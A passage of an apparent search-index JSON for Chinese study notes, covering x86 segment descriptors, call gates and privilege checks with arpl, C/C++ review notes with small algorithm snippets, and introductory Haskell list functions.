bit\uff0c\u5982\u679c\u662f\u6570\u636e\u6bb5\uff0c\u5219 1 \u8868\u793a\u53ef\u5199\uff0c\u4ee3\u7801\u6bb5\u65f6 1 \u8868\u793a\u53ef\u8bfb \u7b2c 0 bit \u4e3a Accessed \u8868\u793a\u63cf\u8ff0\u7b26\u662f\u5426\u88ab\u8bbf\u95ee\u8fc7 \u6bb5\u5730\u5740\uff08\u5176\u5b9e\u53eb selector\uff0910h \u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u7684 DPL \u4e3a 11\uff0c\u5373\u6743\u9650\u4e3a ring3\uff08DPL \u4e3a 3\uff08\u6700\u4f4e\uff09\u7684\u65f6\u5019\u6240\u6709\u7a0b\u5e8f\u90fd\u662f\u6709\u6743\u8bbf\u95ee\u7684\uff09 \u5047\u8bbe\u524d\u9762\u90a3\u6bb5\u4ee3\u7801\u4e2d\u8d4b\u503c\u7ed9 ax \u7684\u6bb5\u5730\u5740\u4e3a 10h\uff0ccs \u4e3a 08h\uff080000 10 00 \uff09\uff0c\u5219 cs.cpl = 00\uff0c\u4e8e\u662f cs.cpl < 10h->descriptor.DPL\uff0c\u56e0\u6b64\u5f53\u524d\u7a0b\u5e8f\u6709\u6743\u628a ds \u8d4b\u503c\u4e3a 10h\uff0c\u5373\u6709\u6743\u8bbf\u95ee\u8be5\u6bb5\u4e2d\u7684\u6570\u636e \u82e5\u6bb5\u63cf\u8ff0\u7b26\u63cf\u8ff0\u7684\u662f\u4e00\u4e2a\u6570\u636e\u6bb5\uff0c\u5219\u8bbf\u95ee\u8005\u7684 CPL \u5fc5\u987b \u5c0f\u4e8e\u7b49\u4e8e \u8be5\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL\u3002\u82e5\u6bb5\u63cf\u8ff0\u7b26\u63cf\u8ff0\u7684\u662f\u4e00\u4e2a\u4ee3\u7801\u6bb5\uff0c\u5219\u8bbf\u95ee\u8005\u7684 CPL \u5fc5\u987b \u7b49\u4e8e \u8be5\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL \u624d\u80fd jmp\u3001call \u5230\u8be5\u6bb5\u91cc\u9762\u7684\u51fd\u6570 \u5f53\u8bbf\u95ee\u8005\u7684 CPL \u5927\u4e8e\u67d0\u4e2a\u4ee3\u7801\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL \u65f6\uff0c\u5219\u53ea\u80fd\u7528 call call_gate_selector:0 \u8fd9\u6837\u7684\u65b9\u5f0f\u95f4\u63a5\u8c03\u7528\u8be5\u4ee3\u7801\u6bb5\u4e2d\u7684\u51fd\u6570","title":"\u6bb5\u63cf\u8ff0\u7b26"},{"location":"cs/pl/asm/#call-gate","text":"call gate \u5373\u8c03\u7528\u95e8\uff0c\u53ef\u4ee5\u770b\u4f5c\u4f4e\u6743\u9650\u8c03\u7528\u9ad8\u6743\u9650\u51fd\u6570\u7684\u8df3\u677f\u3002\u5b83\u672c\u8eab\u9700\u8981\u7528 8 \u4e2a\u5b57\u8282\u6765\u63cf\u8ff0\uff0c\u683c\u5f0f\u4f8b\u5982\uff1a +---+--------------------+---+-- \u76ee\u6807\u51fd\u6570\u504f\u79fb\u5730\u5740 | | | | -- -- -- -- gdt+20h 78, 56, 08, 00, 02, EC, 34, 12 == == ^^ ~~ | | | | +-------|----|--|---+---- \u5c5e\u6027 | | | +---- \u53c2\u6570\u7684\u4e2a\u6570 | +----+---- \u76ee\u6807\u51fd\u6570\u7684\u6bb5\u5730\u5740\uff08selector\uff09 | EC = 1110 1100 |==^ ---- || | | || | +-- type\uff0c0C \u5373\u8868\u793a\u662f 32 \u4f4d\u8c03\u7528\u95e8 || +-- S = 0\uff0c\u662f\u7cfb\u7edf\u63cf\u8ff0\u7b26 |+-- DPL +-- Present \u5f53 gdt \u91cc\u7684 S = 0 \u65f6\uff0c\u8868\u793a\u5f53\u524d\u63cf\u8ff0\u7b26\u662f\u4e00\u4e2a\u7cfb\u7edf\u63cf\u8ff0\u7b26\u800c\u4e0d\u662f\u6570\u636e\u6bb5\u6216\u4ee3\u7801\u6bb5\u7684\u63cf\u8ff0\u7b26\u3002\u7cfb\u7edf\u63cf\u8ff0\u7b26\u6709 tss\uff08task state segment\uff09\u63cf\u8ff0\u7b26\u3001task gate \u63cf\u8ff0\u7b26\u3001interrupt gate \u63cf\u8ff0\u7b26\u3001trap gate \u63cf\u8ff0\u7b26\u7b49\uff0cS = 0 \u4e14 type = 1100b \u65f6\u5373\u8868\u793a\u5f53\u524d\u63cf\u8ff0\u7b26\u662f 32 \u4f4d\u7684\u8c03\u7528\u95e8 \u5c5e\u6027\u4e2d\u7684 DPL \u662f call gate \u81ea\u5df1\u7684\u6743\u9650\u800c\u4e0d\u662f\u76ee\u6807\u51fd\u6570\u7684\u6743\u9650\uff0c\u76ee\u6807\u51fd\u6570\u7684 DPL \u8981\u901a\u8fc7\u7b2c 2\u30013 \u5b57\u8282\u7684 selector \u627e\u5230\u5bf9\u5e94\u63cf\u8ff0\u7b26\u7684 DPL \u8c03\u7528 call gate \u65f6\u7684\u6743\u9650\u6bd4\u8f83\uff1a \u8c03\u7528\u8005\u7684 CPL <= call_gate_selector->descripter.DPL \u8c03\u7528\u8005\u7684 CPL >= call_gate_selector->descriptor.target_selector->descriptor.DPL CPU \u4ece ROM \u542f\u52a8\u540e\u8fdb\u5165\u5b9e\u6a21\u5f0f\uff0c\u800c\u5b9e\u6a21\u5f0f\u7684\u6743\u9650\u90fd\u662f ring0\uff0c\u53ef\u4ee5\u5728\u5b9e\u6a21\u5f0f\u4e2d\u6267\u884c retf \u6765\u964d\u7ea7\u5230 ring3\u3002\u6784\u9020 jmp far ptr tss_selector:0 \u53ef\u4ee5\u4ece ring0 \u5f3a\u884c\u8df3\u56de ring3\uff08\u9700\u8981\u6784\u9020 tss \u4e0e\u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\uff09 \u4ee5 memset(p, 0, n) \u4e3a\u4f8b\uff0cring0 \u51fd\u6570\u5982\u4f55\u9632\u6b62 ring3 \u4f20\u9012\u4e00\u4e2a\u6076\u610f\u7684\u6307\u9488\u5982 ring0 \u6307\u9488 p\u3002ring3 \u8fdb\u7a0b\u5047\u5982\u4e0d\u8c03\u7528 memset()\uff0c\u800c\u662f\u81ea\u5df1\u505a *p = ... \u7684\u5199\u5165\u4e00\u5b9a\u4f1a\u89e6\u53d1 GPF(General Protect Fault) \u5373\u5728\u8be5\u6307\u4ee4\u524d\u63d2\u5165\u5e76\u8c03\u7528 int 0Dh \u5047\u8bbe\u5728 ring3 \u4e2d\u8c03\u7528 memset(p, 0, 1) p = 0x2800000000\uff08\u5047\u8bbe 0x28 \u8fd9\u4e2a selector \u5bf9\u5e94\u6bb5\u7684 DPL \u662f 0\uff09 push 1 push 0 push 28 h push 0 call far ptr call_gate_to_memset : 0 \u5f53\u8fd9\u6761 call \u53d1\u751f\u65f6\uff0cring3 \u7684\u5806\u6808\u4e2d\u4ec5\u6709 call \u6307\u4ee4\u4e0a\u65b9 push \u7684\u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u4e0b\u6761\u6307\u4ee4\u7684\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u3002CPU \u4f1a\u4ece\u5f53\u524d\u8fdb\u7a0b\u7684 tss\uff08task state segment\uff0c\u901a\u8fc7 ltr \u6307\u4ee4\u8d4b\u503c\uff09\u4e2d\u53d6\u51fa ss0 \u53ca esp0 \u4f5c\u4e3a\u65b0\u7684\u5806\u6808\u6307\u9488\uff08ss = ss0, esp = esp0\uff09\uff0c\u8fdb\u884c\u5806\u6808\u5207\u6362\u3002\u4e4b\u540e\u8fdb\u884c\u7684\u64cd\u4f5c\u6709\uff1a push ring3 \u7684 ss\u3001push ring3 \u7684 esp \u628a ring3 \u4e2d\u7684\u53c2\u6570\u5168\u90e8\u590d\u5236\u5230 ring0 \u5806\u6808\u4e2d push ring3 \u7684 cs\u3001push ring3 \u7684 eip jmp \u76ee\u6807\u51fd\u6570 memset \u51fd\u6570\u4e2d\u4f1a\u53d6\u51fa\u8c03\u7528\u8005\u7684 cs\uff0c\u53d6\u51fa CPL \u4e0e\u53c2\u6570 p \u6bb5\u5730\u5740\u7684 DPL \u8fdb\u884c\u6bd4\u8f83 memset: push ebp mov ebp , esp mov cx , [ ebp + 8 ] ; \u8c03\u7528\u8005 ring3 \u7684 cs mov ax , [ ebp + 10 h ] ; 28h arpl ax , cx ; adjust request privilege level ; \u4f1a\u628a cx \u7684\u4f4e 2 \u4f4d\u590d\u5236\u7ed9 ax \u7684\u4f4e 2 \u4f4d\uff0c\u5373 ax \u53d8\u4e3a 2Bh mov ds , ax ; \u8fd9\u91cc\u4f1a\u89e6\u53d1 GPF ; CPU \u8fdb\u884c\u6743\u9650\u68c0\u67e5\uff0c\u5f53 cs.cpl <= 28h \u6bb5\u7684 DPL ; && ax.rpl <= 28h \u6bb5\u7684 DPL \u65f6\u624d\u80fd\u8d4b\u503c\u6210\u529f\uff08ax.rpl \u5373 ax \u7684\u4f4e 2 \u4f4d\uff09 arpl \u4fdd\u62a4\u6a21\u5f0f \u6307\u4ee4\u683c\u5f0f \uff1aarpl dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08adjust request privilege level\uff09\u5f53 src \u7684\u4f4e 2 \u4f4d\u5927\u4e8e dest \u7684\u4f4e 2 \u4f4d\u65f6\uff0c\u4f1a\u628a src \u7684\u4f4e 2 \u4f4d\u590d\u5236\u7ed9 dest \u7684\u4f4e 2 \u4f4d \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0csrc \u4e3a\u5bc4\u5b58\u5668","title":"call gate"},{"location":"cs/pl/c_cpp/","text":"C/C++ \u00b6 Abstract \u8bb0\u5f55\u4e00\u4e9b\u7b2c\u4e00\u6b21\u89c1\u8fc7\u7684\u7528\u6cd5\u3001\u6709\u7528\u7684\u6587\u7ae0/\u5de5\u5177\uff0c\u4ee5\u53ca\u5bb9\u6613\u5fd8\u7684\u77e5\u8bc6\u70b9 \u6d59\u6c5f\u5927\u5b66 \u201c\u7a0b\u5e8f\u8bbe\u8ba1\u4e0e\u7b97\u6cd5\u57fa\u7840\u201d\uff08\u5927\u4e00\u79cb\u51ac\uff09\u8bfe\u7a0b\u590d\u4e60\u7b14\u8bb0 \u7a0b\u5e8f\u8bbe\u8ba1\u4e0e\u7b97\u6cd5\u57fa\u7840 \u00b6 \u8003\u8bd5\u6613\u9519\u9898 \u00b6 zjj\u5927\u4f6c\u6574\u7406\u7684\u7a0b\u7b97\u6613\u9519\u9898 \u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7 \u00b6 \u4f18\u5148\u7ea7 \u8fd0\u7b97\u7b26 \u7ed3\u5408\u5f8b 1 \u540e\u7f00\u8fd0\u7b97\u7b26\uff1a[] () \u00b7 -> \u4ece\u5de6\u5230\u53f3 2 \u4e00\u5143\u8fd0\u7b97\u7b26\uff1a++ -- ! ~ +\uff08\u6b63\uff09 -\uff08\u8d1f\uff09 * & sizeof \u7c7b\u578b\u8f6c\u6362 \u4ece\u53f3\u5230\u5de6 3 \u4e58\u9664\u6cd5\u8fd0\u7b97\u7b26\uff1a* / % \u4ece\u5de6\u5230\u53f3 4 \u52a0\u51cf\u6cd5\u8fd0\u7b97\u7b26\uff1a+ - \u4ece\u5de6\u5230\u53f3 5 \u79fb\u4f4d\u8fd0\u7b97\u7b26\uff1a<< >> \u4ece\u5de6\u5230\u53f3 6 \u5173\u7cfb\u8fd0\u7b97\u7b26\uff1a< <= > >= \u4ece\u5de6\u5230\u53f3 7 \u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a== != \u4ece\u5de6\u5230\u53f3 8 \u4f4d\u8fd0\u7b97\u7b26 AND\uff1a& \u4ece\u5de6\u5230\u53f3 9 \u4f4d\u8fd0\u7b97\u7b26 XOR\uff1a^ \u4ece\u5de6\u5230\u53f3 10 \u4f4d\u8fd0\u7b97\u7b26 OR\uff1a| \u4ece\u5de6\u5230\u53f3 11 \u903b\u8f91\u8fd0\u7b97\u7b26 AND\uff1a&& \u4ece\u5de6\u5230\u53f3 12 \u903b\u8f91\u8fd0\u7b97\u7b26 OR\uff1a|| \u4ece\u5de6\u5230\u53f3 13 \u6761\u4ef6\u8fd0\u7b97\u7b26\uff1a?: \u4ece\u53f3\u5230\u5de6 14 \u8d4b\u503c\u8fd0\u7b97\u7b26\uff1a= += -= *= /= %= &= ^= |= <<= >>= \u4ece\u53f3\u5230\u5de6 15 \u9017\u53f7\u8fd0\u7b97\u7b26\uff1a\uff0c \u4ece\u5de6\u5230\u53f3 \u6613\u5fd8\u7b97\u6cd5 \u00b6 gcd int gcd ( int a , int b ) { return b == 0 ? a : gcd ( b , a % b ); } exgcd void exgcd ( int a , int b , int * d , int * x , int * y ) { if ( ! b ) { * d = a ; * x = 1 ; * y = 0 ; } else { exgcd ( b , a % b , d , y , x ); * y -= * x * ( a / b ); } } \u5feb\u901f\u5e42 int pow_mod ( int a , int p , int n ){ long long res = 1 ; while ( p ) { if ( p & 1 ) res = 1L L * res * a % n ; a = 1L L * a * a % n ; p >>= 1 ; } return ( int ) res ; } \u8f93\u51fa\u7c7b\u578b \u00b6 \u522b\u7684\u8bed\u8a00\uff08\u6bd4\u5982 Python\u3001Haskell\uff09\u5f88\u591a\u90fd\u53ef\u4ee5\u901a\u8fc7\u5185\u7f6e\u7684\u65b9\u6cd5\u8f7b\u677e\u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u4f46\u662f C/C++ \u7684\u8bdd\u4ece\u6765\u6ca1\u4e86\u89e3\u8fc7\uff08C \u5230\u76ee\u524d\u4e5f\u6ca1\u4e86\u89e3\u8fc7\u5185\u7f6e\u7684\u6709\u8fd9\u79cd\u529f\u80fd\u7684\u5e93\uff09 \u67e5\u5230\u4e86 C++ \u53ef\u4ee5\u4f7f\u7528 typeid(...).name() \u7684\u65b9\u6cd5\uff08\u5728\u5934\u6587\u4ef6 <typeinfo> \u4e2d\uff09\u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u4f46\u662f\u7ed3\u679c\u6bd4\u8f83\u62bd\u8c61 C++ \u8fd8\u53ef\u4ee5\u4f7f\u7528\u5934\u6587\u4ef6 <cxxabi.h> \u8fd9\u4e2a\u5e93\u91cc\u63d0\u4f9b\u7684 abi::__cxa_demangle \u51fd\u6570\u6765\u5f97\u5230\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982\uff1a #include <stdio.h> #include <cxxabi.h> #include <typeinfo> int main () { int * ( * p )[ 10 ]; char * str = abi :: __cxa_demangle ( typeid ( p ). name (), NULL , NULL , NULL ); printf ( \"%s \\n \" , str ); // \u5f97\u5230 int* (*) [10] return 0 ; } \u53c8\u641c\u7d22\u5230\u4e86 https://cdecl.org/ \u8fd9\u4e2a\u7f51\u7ad9\u3002\u5f3a\u7684\u5f88\uff0c\u76f4\u63a5\u8f93\u5165\u7c7b\u578b\u58f0\u660e\u5c31\u53ef\u4ee5\u8f6c\u6362\u5f97\u5230\u82f1\u6587\u63cf\u8ff0\uff0c\u4e5f\u53ef\u4ee5\u7ed9\u82f1\u6587\u63cf\u8ff0\u8f6c\u6362\u6210\u7c7b\u578b\u58f0\u660e \u6e90\u7801\uff1a ridiculousfish/cdecl-blocks","title":"C/C++"},{"location":"cs/pl/c_cpp/#cc","text":"Abstract \u8bb0\u5f55\u4e00\u4e9b\u7b2c\u4e00\u6b21\u89c1\u8fc7\u7684\u7528\u6cd5\u3001\u6709\u7528\u7684\u6587\u7ae0/\u5de5\u5177\uff0c\u4ee5\u53ca\u5bb9\u6613\u5fd8\u7684\u77e5\u8bc6\u70b9 \u6d59\u6c5f\u5927\u5b66 \u201c\u7a0b\u5e8f\u8bbe\u8ba1\u4e0e\u7b97\u6cd5\u57fa\u7840\u201d\uff08\u5927\u4e00\u79cb\u51ac\uff09\u8bfe\u7a0b\u590d\u4e60\u7b14\u8bb0","title":"C/C++"},{"location":"cs/pl/c_cpp/#_1","text":"","title":"\u7a0b\u5e8f\u8bbe\u8ba1\u4e0e\u7b97\u6cd5\u57fa\u7840"},{"location":"cs/pl/c_cpp/#_2","text":"zjj\u5927\u4f6c\u6574\u7406\u7684\u7a0b\u7b97\u6613\u9519\u9898","title":"\u8003\u8bd5\u6613\u9519\u9898"},{"location":"cs/pl/c_cpp/#_3","text":"\u4f18\u5148\u7ea7 \u8fd0\u7b97\u7b26 \u7ed3\u5408\u5f8b 1 \u540e\u7f00\u8fd0\u7b97\u7b26\uff1a[] () \u00b7 -> \u4ece\u5de6\u5230\u53f3 2 \u4e00\u5143\u8fd0\u7b97\u7b26\uff1a++ -- ! ~ +\uff08\u6b63\uff09 -\uff08\u8d1f\uff09 * & sizeof \u7c7b\u578b\u8f6c\u6362 \u4ece\u53f3\u5230\u5de6 3 \u4e58\u9664\u6cd5\u8fd0\u7b97\u7b26\uff1a* / % \u4ece\u5de6\u5230\u53f3 4 \u52a0\u51cf\u6cd5\u8fd0\u7b97\u7b26\uff1a+ - \u4ece\u5de6\u5230\u53f3 5 \u79fb\u4f4d\u8fd0\u7b97\u7b26\uff1a<< >> \u4ece\u5de6\u5230\u53f3 6 \u5173\u7cfb\u8fd0\u7b97\u7b26\uff1a< <= > >= \u4ece\u5de6\u5230\u53f3 7 \u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a== != \u4ece\u5de6\u5230\u53f3 8 \u4f4d\u8fd0\u7b97\u7b26 AND\uff1a& \u4ece\u5de6\u5230\u53f3 9 \u4f4d\u8fd0\u7b97\u7b26 XOR\uff1a^ \u4ece\u5de6\u5230\u53f3 10 \u4f4d\u8fd0\u7b97\u7b26 OR\uff1a| \u4ece\u5de6\u5230\u53f3 11 \u903b\u8f91\u8fd0\u7b97\u7b26 AND\uff1a&& \u4ece\u5de6\u5230\u53f3 12 \u903b\u8f91\u8fd0\u7b97\u7b26 OR\uff1a|| \u4ece\u5de6\u5230\u53f3 13 \u6761\u4ef6\u8fd0\u7b97\u7b26\uff1a?: \u4ece\u53f3\u5230\u5de6 14 \u8d4b\u503c\u8fd0\u7b97\u7b26\uff1a= += -= *= /= %= &= ^= |= <<= >>= \u4ece\u53f3\u5230\u5de6 15 \u9017\u53f7\u8fd0\u7b97\u7b26\uff1a\uff0c \u4ece\u5de6\u5230\u53f3","title":"\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7"},{"location":"cs/pl/c_cpp/#_4","text":"gcd int gcd ( int a , int b ) { return b == 0 ? a : gcd ( b , a % b ); } exgcd void exgcd ( int a , int b , int * d , int * x , int * y ) { if ( ! b ) { * d = a ; * x = 1 ; * y = 0 ; } else { exgcd ( b , a % b , d , y , x ); * y -= * x * ( a / b ); } } \u5feb\u901f\u5e42 int pow_mod ( int a , int p , int n ){ long long res = 1 ; while ( p ) { if ( p & 1 ) res = 1L L * res * a % n ; a = 1L L * a * a % n ; p >>= 1 ; } return ( int ) res ; }","title":"\u6613\u5fd8\u7b97\u6cd5"},{"location":"cs/pl/c_cpp/#_5","text":"\u522b\u7684\u8bed\u8a00\uff08\u6bd4\u5982 Python\u3001Haskell\uff09\u5f88\u591a\u90fd\u53ef\u4ee5\u901a\u8fc7\u5185\u7f6e\u7684\u65b9\u6cd5\u8f7b\u677e\u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u4f46\u662f C/C++ \u7684\u8bdd\u4ece\u6765\u6ca1\u4e86\u89e3\u8fc7\uff08C \u5230\u76ee\u524d\u4e5f\u6ca1\u4e86\u89e3\u8fc7\u5185\u7f6e\u7684\u6709\u8fd9\u79cd\u529f\u80fd\u7684\u5e93\uff09 \u67e5\u5230\u4e86 C++ \u53ef\u4ee5\u4f7f\u7528 typeid(...).name() \u7684\u65b9\u6cd5\uff08\u5728\u5934\u6587\u4ef6 <typeinfo> \u4e2d\uff09\u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u4f46\u662f\u7ed3\u679c\u6bd4\u8f83\u62bd\u8c61 C++ \u8fd8\u53ef\u4ee5\u4f7f\u7528\u5934\u6587\u4ef6 <cxxabi.h> \u8fd9\u4e2a\u5e93\u91cc\u63d0\u4f9b\u7684 abi::__cxa_demangle \u51fd\u6570\u6765\u5f97\u5230\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982\uff1a #include <stdio.h> #include <cxxabi.h> #include <typeinfo> int main () { int * ( * p )[ 10 ]; char * str = abi :: __cxa_demangle ( typeid ( p ). name (), NULL , NULL , NULL ); printf ( \"%s \\n \" , str ); // \u5f97\u5230 int* (*) [10] return 0 ; } \u53c8\u641c\u7d22\u5230\u4e86 https://cdecl.org/ \u8fd9\u4e2a\u7f51\u7ad9\u3002\u5f3a\u7684\u5f88\uff0c\u76f4\u63a5\u8f93\u5165\u7c7b\u578b\u58f0\u660e\u5c31\u53ef\u4ee5\u8f6c\u6362\u5f97\u5230\u82f1\u6587\u63cf\u8ff0\uff0c\u4e5f\u53ef\u4ee5\u7ed9\u82f1\u6587\u63cf\u8ff0\u8f6c\u6362\u6210\u7c7b\u578b\u58f0\u660e \u6e90\u7801\uff1a ridiculousfish/cdecl-blocks","title":"\u8f93\u51fa\u7c7b\u578b"},{"location":"cs/pl/haskell/","text":"Haskell \u662f\u4e00\u79cd\u6807\u51c6\u5316\u7684\uff0c\u901a\u7528\u7684\u7eaf\u51fd\u6570\u5f0f\u7f16\u7a0b\u8bed\u8a00\uff0c\u6709\u60f0\u6027\u6c42\u503c\u548c\u5f3a\u9759\u6001\u7c7b\u578b\u3002\u5b83\u7684\u547d\u540d\u6e90\u81ea\u7f8e\u56fd\u903b\u8f91\u5b66\u5bb6\u54c8\u65af\u51ef\u5c14\u00b7\u52a0\u91cc\uff0c\u4ed6\u5728\u6570\u7406\u903b\u8f91\u65b9\u9762\u4e0a\u7684\u5de5\u4f5c\u4f7f\u5f97\u51fd\u6570\u5f0f\u7f16\u7a0b\u8bed\u8a00\u6709\u4e86\u5e7f\u6cdb\u7684\u57fa\u7840\u3002\u5728 Haskell \u4e2d\uff0c\u201c\u51fd\u6570\u662f\u7b2c\u4e00\u7c7b\u5bf9\u8c61\u201d\u3002\u4f5c\u4e3a\u4e00\u95e8\u51fd\u6570\u7f16\u7a0b\u8bed\u8a00\uff0c\u4e3b\u8981\u63a7\u5236\u7ed3\u6784\u662f\u51fd\u6570\u3002Haskell \u8bed\u8a00\u662f1990\u5e74\u5728\u7f16\u7a0b\u8bed\u8a00 Miranda \u7684\u57fa\u7840\u4e0a\u6807\u51c6\u5316\u7684\uff0c\u5e76\u4e14\u4ee5\u03bb\u6f14\u7b97\u4e3a\u57fa\u7840\u53d1\u5c55\u800c\u6765\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48 Haskell \u8bed\u8a00\u4ee5\u5e0c\u814a\u5b57\u6bcd \u201c\u03bb\u201d\uff08Lambda\uff09\u4f5c\u4e3a\u81ea\u5df1\u7684\u6807\u5fd7\u3002Haskell \u5177\u6709\u201c\u8bc1\u660e\u5373\u7a0b\u5e8f\u3001\u547d\u9898\u4e3a\u7c7b\u578b\u201d\u7684\u7279\u5f81\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 \u57fa\u7840\u8fd0\u7b97 \u00b6 + - * / () \uff1a\u52a0\u51cf\u4e58\u9664 div \uff1a\u6574\u9664 mod \uff1a\u53d6\u6a21 True False \uff1a\u5e03\u5c14\u503c || && not \uff1a\u6216\u4e14\u975e == \uff1a\u6761\u4ef6\u5224\u65ad\uff0c\u76f8\u7b49 /= \uff1a\u6761\u4ef6\u5224\u65ad\uff0c\u4e0d\u7b49 \u51fd\u6570\u8c03\u7528 \u00b6 Haskell \u4e2d\u8c03\u7528\u51fd\u6570\u4e0d\u52a0\u62ec\u53f7\uff0c\u5148\u5199\u51fa\u51fd\u6570\u540d\uff0c\u7136\u540e\u9010\u4e2a\u5217\u51fa\u53c2\u6570\uff0c\u7528\u7a7a\u683c\u9694\u5f00\uff1a ghci > max 1 2 2 \u524d\u7f00\uff08prefix\uff09\u51fd\u6570\u4e0e\u4e2d\u7f00\uff08infix\uff09\u51fd\u6570\u8f6c\u6362\uff1a \u5bf9\u524d\u7f00\u51fd\u6570\u52a0 `` \u4f7f\u5176\u53d8\u6210\u4e2d\u7f00\u51fd\u6570 \u5bf9\u4e2d\u7f00\u51fd\u6570\u52a0 () \u4f7f\u5176\u53d8\u6210\u524d\u7f00\u51fd\u6570 ghci > 4 ` div ` 2 2 ghci > 1 ` max ` 2 2 ghci > ( + ) 1 2 3 ghci > ( || ) True False True List \u00b6 \u5217\u8868\u662f Haskell \u4e2d\u5f88\u5e38\u89c1\u7684\u6570\u636e\u7c7b\u578b\uff0c\u548c Python \u4e2d\u4e0d\u540c\uff0cHaskell \u4e2d\u7684\u5217\u8868\u4e2d\u7684\u6240\u6709\u5143\u7d20\u5fc5\u987b\u662f\u540c\u4e00\u4e2a\u7c7b\u578b\u3002 \u4ee5\u4e0b\u662f\u5217\u8868\u5e38\u7528\u7684\u51fd\u6570\uff1a (++) :: [a] -> [a] -> [a]\uff1a\u5408\u5e76\u4e24\u4e2a\u5217\u8868 (:) :: a -> [a] -> [a]\uff1a\u5c06\u5355\u4e2a\u5143\u7d20\u5e76\u5165\u5217\u8868\u3002[1, 2, 3] \u662f 1:2:3:[] \u7684\u8bed\u6cd5\u7cd6 (!!) :: [a] -> Int -> a\uff1a\u901a\u8fc7\u7d22\u5f15\u53d6\u51fa\u67d0\u4e2a\u4f4d\u7f6e\u4e0a\u7684\u5143\u7d20\u3002a !! 1 \u76f8\u5f53\u4e8e Python \u4e2d\u7684 a[1] head :: [a] -> a\uff1a\u8fd4\u56de\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 tail :: [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u9664\u53bb\u7b2c\u4e00\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868\uff08\u82e5\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u5219\u8fd4\u56de\u7a7a\u5217\u8868[]\uff09 last :: [a] -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20 init :: [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u9664\u53bb\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868 length :: Foldable t => t a -> Int\uff1a\u8fd4\u56de\u5217\u8868\u7684\u957f\u5ea6 null :: Foldable t => t a -> Bool\uff1a\u8fd4\u56de\u5217\u8868\u662f\u5426\u4e3a\u7a7a reverse :: [a] -> [a]\uff1a\u8fd4\u56de\u7ffb\u8f6c\u540e\u7684\u5217\u8868 take :: Int -> [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868a\u7684\u524dn\u4e2a\u5143\u7d20\u7684\u5217\u8868(take n a) drop :: Int -> [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868a\u4e2d\u9664\u53bb\u524dn\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868(drop n a) maximum :: (Foldable t, Ord a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c minimum :: (Foldable t, Ord a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c sum :: (Foldable t, Num a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u6240\u6709\u5143\u7d20\u7684\u548c product :: (Foldable t, Num a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u6240\u6709\u5143\u7d20\u7684\u79ef elem :: (Foldable t, Eq a) => t a -> Bool\uff1a\u5224\u65ad\u503cn\u662f\u5426\u5728\u5217\u8868a\u4e2d elem n a -- \u6216 n ` elem ` a --\u7528``\u5305\u4e0a\u53ef\u4ee5\u53d8\u6210\u4e2d\u7f00\u51fd\u6570\u4f7f\u7528 Texas ranges \u00b6 \u4f7f\u7528 .. \u53ef\u4ee5\u8868\u793a\u51fa\u8303\u56f4\u5e76\u81ea\u52a8\u63a8\u5bfc\uff1a ghci > [ 1 .. 10 ] [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] ghci > [ 'a' .. 'z' ] \"abcdefghijklmnopqrstuvwxyz\" ghci > [ 'K' .. 'Z' ] \"KLMNOPQRSTUVWXYZ\" ghci > [ 2 , 4 .. 20 ] [ 2 , 4 , 6 , 8 , 10 , 12 , 14 , 16 , 18 , 20 ] ghci > [ 3 , 6 .. 20 ] [ 3 , 6 , 9 , 12 , 15 , 18 ] ghci > [ 5 , 4 .. 1 ] [ 5 , 4 , 3 , 2 , 1 ] \u4e5f\u53ef\u4ee5\u7528\u6765\u751f\u6210\u65e0\u7a77\u5217\u8868\uff0c\u5982 [1..]\u3001[1, 3..]\u3002\u540c\u65f6\u4e5f\u6709\u51fd\u6570\u53ef\u4ee5\u751f\u6210\u65e0\u7a77\u5217\u8868\uff1a cycle :: [a] -> [a]\uff1a\u5c06\u539f\u5217\u8868\u4e0d\u65ad\u5faa\u73af\u751f\u6210\u65e0\u7a77\u5217\u8868 repeat :: a -> [a]\uff1a\u5c06\u4f20\u5165\u7684\u503c\u4e0d\u65ad\u91cd\u590d\u751f\u6210\u65e0\u7a77\u5217\u8868 replicate :: Int -> a -> 